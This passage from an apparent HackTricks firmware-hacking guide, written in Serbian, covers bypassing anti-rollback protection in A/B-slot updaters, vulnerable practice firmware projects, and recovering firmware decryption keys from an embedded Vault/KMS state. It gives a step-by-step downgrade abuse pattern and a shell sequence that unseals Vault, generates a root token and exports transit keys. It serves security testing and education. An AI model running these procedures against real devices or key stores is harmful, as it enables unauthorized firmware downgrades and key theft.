$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje anti-rollback zaštite samo u updater-u kod dizajna sa A/B slotovima

Neki proizvođači implementiraju **ratchet** protiv vraćanja na stariju verziju, ali samo u logici *updater-a* (na primer, UDS rutina preko CAN-a, recovery komanda ili OTA agent u userspace-u). Ako **bootloader** kasnije proverava samo potpis/CRC slike i veruje tabeli particija ili metapodacima slota, zaštita od vraćanja na stariju verziju i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmware-a sadrže i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater upoređuje ratchet slike sa vrednošću sačuvanom u trajnoj memoriji i odbija starije potpisane slike.
- Bootloader **ne** parsira taj ratchet i pre pokretanja izabranog slota proverava samo zaglavlje, CRC i potpis.
- Aktivacija slota čuva se odvojeno, u tabeli particija ili brojaču generacije za svaki slot, i nije **kriptografski vezana** za tačan digest firmware-a koji je proveren.

To u sistemima sa dva slota omogućava primitivu **proveri jednu sliku / pokreni drugu**. Ako napadač može da navede updater da označi slot B kao sledeću metu za pokretanje pomoću trenutno potpisane slike, a zatim da pre ponovnog pokretanja prepiše slot B, bootloader ipak može da pokrene stariju sliku jer veruje samo već potvrđenim metapodacima slota.

Uobičajen obrazac zloupotrebe:

1. Otpremite **trenutni potpisani** firmware u pasivni slot i pokrenite uobičajenu rutinu provere/prebacivanja da bi raspored označio taj slot kao sledeći aktivni.
2. **Još nemojte ponovo pokretati uređaj**. U istoj sesiji ponovo pokrenite rutinu za pripremu/brisanje slota.
3. Iskoristite zastarelo stanje pokretanja ili zastarelu logiku izbora slota da bi updater obrisao **isti fizički slot** koji je upravo promovisan.
4. Upišite u taj slot **stariji, ali i dalje potpisan** firmware.
5. Preskočite rutinu provere koja sprovodi ratchet i direktno ponovo pokrenite uređaj.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i pokreće staru sliku.

Na šta obratiti pažnju pri reverznom inženjeringu A/B implementacija ažuriranja:

- Izbor slota izveden iz **zastavica pri pokretanju** koje se ne osvežavaju nakon uspešnog prebacivanja.
- Rutina tipa `prepare_passive_slot()` koja briše slot na osnovu zastarelog stanja umesto na osnovu **trenutnog potvrđenog rasporeda**.
- Funkcija tipa `part_write_layout()` koja samo uvećava **brojač generacije** / aktivnu zastavicu i ne čuva hash proverene slike.
- Provere ratchet-a implementirane u userspace-u ili kodu updater-a, ali **ne** u ROM-u / bootloader-u / fazama secure boot-a.
- Rutine za brisanje ili oporavak koje ostavljaju slot označenim kao pokretljivim čak i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Kontrolna lista za procenu logike ažuriranja

* Da li je transport/autentifikacija *update endpoint*-a adekvatno zaštićena (TLS + autentifikacija)?
* Da li uređaj pre upisivanja proverava **brojeve verzija** ili **monotoni anti-rollback brojač**?
* Da li se slika proverava u okviru secure boot lanca (npr. ROM kod proverava potpise)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci za aktivaciju slota **vezani za digest/verziju proverenog firmware-a**, ili se slot može izmeniti nakon promocije?
* Nakon uspešnog prebacivanja slota, da li je uređaj primoran da se ponovo pokrene ili su kasnije rutine za ažuriranje/brisanje i dalje dostupne u istoj sesiji?
* Da li userspace kod obavlja dodatne provere ispravnosti (npr. dozvoljena mapa particija, broj modela)?
* Da li *delimični* ili *backup* tokovi ažuriranja ponovo koriste istu logiku provere?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranjivi firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, za početak koristite sledeće projekte ranjivog firmware-a.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Projekat Damn Vulnerable Router Firmware
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dešifrovanje firmware-a iz ugrađenog KMS/Vault stanja

Kada slika ažuriranja kombinuje male metapodatke u otvorenom tekstu sa velikim blob-om velike entropije, prvo analizirajte kontejner, pre nego što pokušate bilo šta da razbijete brute-force metodom:<sup>[[1]](#references)</sup>

- Izbacite zaglavlja, pomeraje i granice redova pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava format OpenSSL `enc`: sledećih 8 bajtova je salt, a preostali bajtovi su šifrat.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je nagoveštaj da je reč o RSA-2048 šifratu koji obavija nasumičnu lozinku/ključ sesije za firmware.
- Odvojeni PGP materijal u istoj datoteci često štiti samo autentičnost; nemojte pretpostaviti da se njime obezbeđuje poverljivost.

Ako potraga za statičkim ključevima (`grep`, `strings`, PEM/PGP pretrage) ne uspe, obrnuto analizirajte **operativni tok dešifrovanja** umesto da samo tražite privatne ključeve:

- Dekompajlirajte updater / binarnu datoteku za upravljanje i pratite ko čita šifrovani blob, koji pomoćni program/API ga dešifruje i koji logički naziv ključa se traži.
- U izdvojenom root filesystem-u potražite KMS stanje (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit datoteke i init skripte.
- Tretirajte tekst u otvorenom obliku `vault operator unseal ...`, recovery ključeve, bootstrap tokene ili lokalne KMS skripte za automatsko otpečaćivanje kao ekvivalent materijalu privatnog ključa.

Ako uređaj isporučuje originalnu Vault binarnu datoteku i pozadinski sistem za skladištenje, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati Vault interne mehanizme:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Omogućite izvoz transit ključeva samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ koristeći tačan par padding/hash koji koristi KMS. Neuspešan PKCS#1 v1.5 decrypt i neuspešan podrazumevani OAEP decrypt **ne** dokazuju da je ključ pogrešan; mnogi Vault-backed tokovi koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, tačno ponovite vendorov OpenSSL KDF (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre nego što pokušate AES-CBC decryption.

Tako „šifrovani firmware“ postaje opštiji problem: **oporavite operativne ključeve na strani uređaja, pa zatim van mreže ponovite tačne parametre za unwrap + KDF**.

## Obuke i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware uz Claude: veštine na seniorskom nivou, autonomija na juniorskom nivou](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktični IoT hacking: Definitivni vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sada me vidiš: sada si pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko konektora priključka za punjenje - 2. deo: zaobilaženje zaštite od downgrade-a](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: Over-the-Air iskorišćavanje Philips Hue Bridge-a](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, 2. deo: otklanjanje grešaka i popravke](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
